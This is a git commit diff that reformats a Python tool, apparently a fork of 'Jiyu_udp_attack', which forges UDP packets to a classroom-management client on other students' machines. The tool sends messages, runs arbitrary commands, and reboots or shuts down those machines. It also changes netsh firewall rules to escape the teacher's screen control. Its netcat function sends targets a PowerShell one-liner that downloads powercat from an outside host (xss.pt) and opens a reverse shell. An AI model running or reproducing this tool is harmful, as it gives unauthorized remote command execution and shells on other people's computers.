4882bece93b76818fc9e0c02ac2c36de667705a9
2409 <95078036+Duck15@users.noreply.github.com>
2024-11-02 13:14:06 +0000

    format code

--- chat.py
+++ chat.py
@@ -18,10 +18,10 @@ store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00
          [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]]
 
 basicCMD = {
-    '-msg': store[0],   # 伪造成消息类数据包
-    '-c': store[1],     # 伪造成命令类数据表
-    '-r': store[2],     # 发送重启命令
-    '-s': store[3],     # 发送关机命令
+    "-msg": store[0],  # 伪造成消息类数据包
+    "-c": store[1],  # 伪造成命令类数据表
+    "-r": store[2],  # 发送重启命令
+    "-s": store[3],  # 发送关机命令
 }
 
 header = """
@@ -31,25 +31,31 @@ header = """
             https://github.com/ht0Ruial/Jiyu_udp_attack
 
 """
-parser = argparse.ArgumentParser(header) # 添加一个命令参数解析器
-parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
-parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
+parser = argparse.ArgumentParser(header)  # 添加一个命令参数解析器
+parser.add_argument("-ip", type=str, help="ip 指定目标IP地址")
 parser.add_argument(
-    '-msg', type=str, help="send_message发送消息 eg: -msg  \"HelloWord!\"")
+    "-p", type=int, default=4705, help="port 指定监听端口，默认端口为4705"
+)
 parser.add_argument(
-    '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
-parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
-parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+    "-msg", type=str, help='send_message发送消息 eg: -msg  "HelloWord!"'
+)
+parser.add_argument("-c", type=str, help='command命令 eg: -c   "cmd.exe /c ipconfig"')
+parser.add_argument("-l", type=int, default=1, help="循环次数，默认为1")
+parser.add_argument("-t", type=int, default=22, help="循环时间间隔，默认是22秒")
 
-parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r"
-                    )
-subparsers = parser.add_subparsers(help='-e 参数的详细说明')
-subparsers.add_parser('r', help='reboot 重启')
-subparsers.add_parser('s', help='shutdown 关机')
-subparsers.add_parser('g', help='独立选项，获取当前的ip地址以及学生端监听的端口')
-subparsers.add_parser('nc', help='独立选项，反弹shell的机器需出网，退出可使用命令exit')
-subparsers.add_parser('break', help='独立选项，脱离屏幕控制，需要管理员权限')
-subparsers.add_parser('continue', help='独立选项，恢复屏幕控制')
+parser.add_argument(
+    "-e",
+    type=str,
+    choices=["r", "s", "g", "nc", "break", "continue"],
+    help="Extra Options加载额外的选项 eg：-e r",
+)
+subparsers = parser.add_subparsers(help="-e 参数的详细说明")
+subparsers.add_parser("r", help="reboot 重启")
+subparsers.add_parser("s", help="shutdown 关机")
+subparsers.add_parser("g", help="独立选项，获取当前的ip地址以及学生端监听的端口")
+subparsers.add_parser("nc", help="独立选项，反弹shell的机器需出网，退出可使用命令exit")
+subparsers.add_parser("break", help="独立选项，脱离屏幕控制，需要管理员权限")
+subparsers.add_parser("continue", help="独立选项，恢复屏幕控制")
 args = parser.parse_args()
 
 
@@ -57,8 +63,8 @@ args = parser.parse_args()
 def format_b4_send(content):
     arr = []
     for ch in content:
-        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
-        if int(tmp, 16) > 0xff:
+        tmp = "".join(list(map(lambda x: hex(ord(x)), ch)))
+        if int(tmp, 16) > 0xFF:
             tmp = tmp[2:]
             high = int((tmp[0] + tmp[1]), 16)
             low = int((tmp[2] + tmp[3]), 16)
@@ -75,28 +81,28 @@ def format_b4_send(content):
 # 获取ip
 def get_ip(ip):
     target_host = []
-    if ip.find('.') == -1:
-        print('\nYou enter a error IP.')
+    if ip.find(".") == -1:
+        print("\nYou enter a error IP.")
         print("Please enter the correct format of the IP again.")
         sys.exit(0)
-    if ip.find('-') != -1:
-        ip_arr = ip.split('-')
-        ip_arrs = ip_arr[0].split('.')
+    if ip.find("-") != -1:
+        ip_arr = ip.split("-")
+        ip_arrs = ip_arr[0].split(".")
         if int(ip_arr[1]) > 254:
-            ip_arr[1] = '254'
-        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
+            ip_arr[1] = "254"
+        for i in range(int(ip_arrs[3]), int(ip_arr[1]) + 1):
             ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
-    elif ip.find('/') == -1:
+            target_host.append(".".join(ip_arrs))
+    elif ip.find("/") == -1:
         target_host.append(ip)
-    elif ip.find('/24') != -1:
-        ip_arr = ip.split('/')
-        ip_arrs = ip_arr[0].split('.')
+    elif ip.find("/24") != -1:
+        ip_arr = ip.split("/")
+        ip_arrs = ip_arr[0].split(".")
         for i in range(1, 255):
             ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
+            target_host.append(".".join(ip_arrs))
     else:
-        print('\nYou enter a error IP.')
+        print("\nYou enter a error IP.")
         print("Please enter the correct format of the IP again.")
         sys.exit(0)
     return target_host
@@ -105,15 +111,15 @@ def get_ip(ip):
 # 将要发送的消息打包成完整的指令 如消息 命令等
 def pkg_sendlist(cmdtype, content):
     arrs = format_b4_send(content)
-    if cmdtype == '-msg':
-        index = 56                      # 从数组的第56个位置开始填充数据
-        result = basicCMD['-msg']
+    if cmdtype == "-msg":
+        index = 56  # 从数组的第56个位置开始填充数据
+        result = basicCMD["-msg"]
         for elem in arrs:
             result[index] = elem
             index += 1
-    elif cmdtype == '-c':
+    elif cmdtype == "-c":
         index = 578
-        result = basicCMD['-c']
+        result = basicCMD["-c"]
         for elem in arrs:
             result[index] = elem
             index += 1
@@ -122,15 +128,15 @@ def pkg_sendlist(cmdtype, content):
 
 # 发送
 def send(send_list):
-    if len(send_list) == 0: # 此处插入myChat， 程序没有给定任意参数时执行此处
+    if len(send_list) == 0:  # 此处插入myChat， 程序没有给定任意参数时执行此处
 
         print("[*] tips: 可以使用 -h 以获取交互式命令帮助~")
         sleep(1)
         chat_main()
         sys.exit(0)
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    if args.ip == None: #err
-        args.ip = get_IP_prefix(getIP())+str(chat_StuID2IP(toStuID))
+    if args.ip == None:  # err
+        args.ip = get_IP_prefix(getIP()) + str(chat_StuID2IP(toStuID))
     target_host = get_ip(args.ip)
     for times in range(args.l):
         for i in target_host:
@@ -139,7 +145,7 @@ def send(send_list):
                 client.sendto(payload, (i, args.p))
         if args.l == 1:
             print("发送成功")
-            if NoExit != True :
+            if NoExit != True:
                 sys.exit(0)
             return 0
         print("第%s次执行完毕" % str(times + 1))
@@ -152,52 +158,58 @@ def creat_send_object():
 
     # 获取命令内容
     if args.msg:
-        send_list.append(pkg_sendlist('-msg', args.msg)) # 传入 -msg 后 的内容 用于发送消息
+        send_list.append(
+            pkg_sendlist("-msg", args.msg)
+        )  # 传入 -msg 后 的内容 用于发送消息
 
     if args.c:
-        send_list.append(pkg_sendlist('-c', args.c))
+        send_list.append(pkg_sendlist("-c", args.c))
 
-    if args.e == 'r':
-        send_list.append(basicCMD['-r'])
+    if args.e == "r":
+        send_list.append(basicCMD["-r"])
 
-    if args.e == 's':
-        send_list.append(basicCMD['-s'])
+    if args.e == "s":
+        send_list.append(basicCMD["-s"])
 
     return send_list
 
 
-def single_command():                                   # 关于 -e 参数的子选项
-    if args.e == 'g':                                   # 当参数为g时，列出学生端的监听端口
+def single_command():  # 关于 -e 参数的子选项
+    if args.e == "g":  # 当参数为g时，列出学生端的监听端口
         try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             print("\nYour ip addres is:" + ip)
 
-            tasklist = popen("tasklist|find \"Student\"").read()
-            pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
+            tasklist = popen('tasklist|find "Student"').read()
+            pattern = compile(r"[e]\s*\d{1,5}\s*[C]")
             pid = (pattern.search(tasklist).group()[1:-1]).strip()
 
-            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
+            netstat = popen('netstat -ano |find "{}"'.format(pid)).read()
             pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
             netstat_pat = pattern.findall(netstat)
 
             ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
-            print("\nYour student client possible ports are:" + ','.join(ports))
-        except:                                         # 即使出错了，也正常执行退出
+            print("\nYour student client possible ports are:" + ",".join(ports))
+        except:  # 即使出错了，也正常执行退出
             pass
         sys.exit(0)
 
-    elif args.e == 'break':                             # 当参数为break时，屏蔽学生端的端口
-        popen('sc config MpsSvc start= auto')
-        popen('net start MpsSvc')
-        popen('netsh advfirewall set allprofiles state on')
-        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
+    elif args.e == "break":  # 当参数为break时，屏蔽学生端的端口
+        popen("sc config MpsSvc start= auto")
+        popen("net start MpsSvc")
+        popen("netsh advfirewall set allprofiles state on")
+        popen(
+            'netsh advfirewall firewall set rule name="StudentMain.exe" new action=block'
+        )
         sleep(1)
         system("cls")
         sys.exit(0)
 
-    elif args.e == 'continue':                          # 当参数为continue时，放行学生端的端口
-        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
+    elif args.e == "continue":  # 当参数为continue时，放行学生端的端口
+        popen(
+            'netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow'
+        )
         sys.exit(0)
 
 
@@ -205,32 +217,43 @@ def netcat(num):
     send_list = []
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
-    send_list.append(pkg_sendlist('-c', cmd))
+    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(
+        ip, num
+    )
+    send_list.append(pkg_sendlist("-c", cmd))
     send(send_list)
-    
+
 
 def run_from_cmd():
     try:
-        single_command() #先检测是否有g参数 如果没有就跳过（无事发生）
-        if args.e != 'nc': # 如果参数不为!nc，则执行send函数，用于
+        single_command()  # 先检测是否有g参数 如果没有就跳过（无事发生）
+        if args.e != "nc":  # 如果参数不为!nc，则执行send函数，用于
             send_list = creat_send_object()
-            send(send_list) 
+            send(send_list)
             sys.exit(0)
-        num = random.randint(1, 65535) # 当参数为-e nc时执行的内容。作用：反弹shell。适用平台：Windows
+        num = random.randint(
+            1, 65535
+        )  # 当参数为-e nc时执行的内容。作用：反弹shell。适用平台：Windows
         pool = Pool(processes=1)
         pool.apply_async(netcat, (num,))
         print("listening on [any] {} ...".format(num))
-        system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
+        system(
+            "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(
+                num
+            )
+        )
         pool.close()
         pool.join()
     except Exception as e:
         print("[-] %s " % e)
-        input("检测到程序似乎发生了一些很神奇的问题,请回报给2409(duck),然后按回车键退出")
+        input(
+            "检测到程序似乎发生了一些很神奇的问题,请回报给2409(duck),然后按回车键退出"
+        )
+
 
 def chat_main():
     global NoExit
-    NoExit  = True
+    NoExit = True
     print("\n\n ~~欢迎使用 *小小私聊*！~~\n\n")
     sleep(0.1)
     print("Author: ht0Ruial, 2409(duck)")
@@ -238,9 +261,9 @@ def chat_main():
     print("Version:%s" % version)
     sleep(1.8)
 
-    print("你的IP地址："+getIP())
+    print("你的IP地址：" + getIP())
     sleep(0.2)
-    print("你的网段："+get_IP_prefix(getIP())+"x")
+    print("你的网段：" + get_IP_prefix(getIP()) + "x")
     sleep(0.4)
     print("\npowerd by Jiyu_udp_attack\n\n")
     StuID = chat_whoami()
@@ -253,29 +276,30 @@ def chat_main():
         sleep(0.5)
         global toStuID
         toStuID = int(input("你想和几号同学说悄悄话？在此输入号数\n："))
-        print("正在尝试寻找你所说的{}号同学".format(toStuID),end='')
+        print("正在尝试寻找你所说的{}号同学".format(toStuID), end="")
         for i in range(10):
-            print(".", end='')
+            print(".", end="")
             sleep(0.1)
-        if  isOnline(get_IP_prefix(getIP())+str(chat_StuID2IP(toStuID))) :
+        if isOnline(get_IP_prefix(getIP()) + str(chat_StuID2IP(toStuID))):
             print("似乎找到了！")
             msg = "111"
             while msg != "bye":
                 sleep(0.8)
                 msg = str(input("和{}号悄悄说：".format(toStuID)))
                 print("正在尝试发送消息...")
-                sleep (1)
-                if msg == "" :
+                sleep(1)
+                if msg == "":
                     print("不可发送空白消息！")
-                else:chat_to_other(prefix+msg)
+                else:
+                    chat_to_other(prefix + msg)
         else:
             print("似乎没有找到你要的同学...")
             print("再输入一次？")
 
 
 def isOnline(IP):
-    result = popen('ping %s' % (IP)).read()
-    if 'ttl' in result or 'TTL' in result:
+    result = popen("ping %s" % (IP)).read()
+    if "ttl" in result or "TTL" in result:
         return True
     else:
         return False
@@ -283,7 +307,7 @@ def isOnline(IP):
 
 def chat_to_other(msg):
     send_list = []
-    send_list.append(pkg_sendlist('-msg',str(msg)))
+    send_list.append(pkg_sendlist("-msg", str(msg)))
     send(send_list)
 
 
@@ -292,14 +316,16 @@ def getIP():
     ip = socket.gethostbyname(hostname)
     return ip
 
-def chat_whoami(): 
+
+def chat_whoami():
     ip = getIP()
-    ip_last_digit = ip.split('.')[-1]
+    ip_last_digit = ip.split(".")[-1]
     # ip_last_digit = 64 # for debug to customizer your ip.
     StuID = chat_IP2StuID(ip_last_digit)
     return StuID
 
-def chat_StuID2IP(StuID:int): # 给出学生号数，求出ip最后一段
+
+def chat_StuID2IP(StuID: int):  # 给出学生号数，求出ip最后一段
     if StuID / 6 == StuID // 6:
         OP = StuID / 6
         ip_last_digit = 60 + OP
@@ -311,26 +337,31 @@ def chat_StuID2IP(StuID:int): # 给出学生号数，求出ip最后一段
         # 求十位时，其为原号数除以6的余数（R）乘10，TP：十位
         # 求个位时，其为原号数除以6，向下取整，然后加1，OP：个位
     return ip_last_digit
-    
-def chat_IP2StuID(ip_last_digit:int): # 给出IP最后一段，求出号数
-    for mayStuID in range(1,61): # range起始不能为0，否则当ip_last_digit为60时则输出0
+
+
+def chat_IP2StuID(ip_last_digit: int):  # 给出IP最后一段，求出号数
+    for mayStuID in range(1, 61):  # range起始不能为0，否则当ip_last_digit为60时则输出0
         StuIP = chat_StuID2IP(mayStuID)
         if StuIP == ip_last_digit:
             return mayStuID
     return -1
 
+
 def get_IP_prefix(ip_address):
     # 分割IP地址为各个部分
-    parts = ip_address.split('.')
+    parts = ip_address.split(".")
     # 移除最后一部分
     parts[:-1]
     # 将剩余部分重新组合成IP地址
-    return '.'.join(parts[:-1])+"."
+    return ".".join(parts[:-1]) + "."
 
-# def transfer_program():
+
+def transfer_program():
+
+    return 0
 
 
 version = 20240102
 
-if __name__ == '__main__': #程序最先执行此处！当用户双击直接执行本脚本时...
+if __name__ == "__main__":  # 程序最先执行此处！当用户双击直接执行本脚本时...
     run_from_cmd()
